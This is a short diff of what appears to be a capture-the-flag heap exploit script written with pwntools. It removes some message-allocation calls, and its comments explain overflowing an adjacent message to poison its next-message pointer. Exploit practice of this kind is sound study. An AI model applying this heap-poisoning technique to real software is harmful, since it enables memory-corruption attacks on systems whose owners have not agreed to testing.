@@ -78,13 +78,6 @@ add_message(p, b"B" * 0x40)  # message 1
 menu(p, 1) # add_message
 add_message(p, b"C" * 0x40)  # message 1
 
-menu(p, 1)
-add_message(p, b"A" * 0x3f + b'\00') # message 0
-menu(p, 1)
-add_message(p, b"B" * 0x3f + b'\00') # message 1
-menu(p, 1)
-add_message(p, b"B" * 0x3f + b'\00') # message 2
-
 # When editing, the next message address of the index - 1 message will be used to store the message data.
 # In order to bypass the first 8 bytes, 8 bytes are added to the index - 1 next message address.
 # By editing the index - 1 message we are trying to poison, we overflow the index -1 message and set the
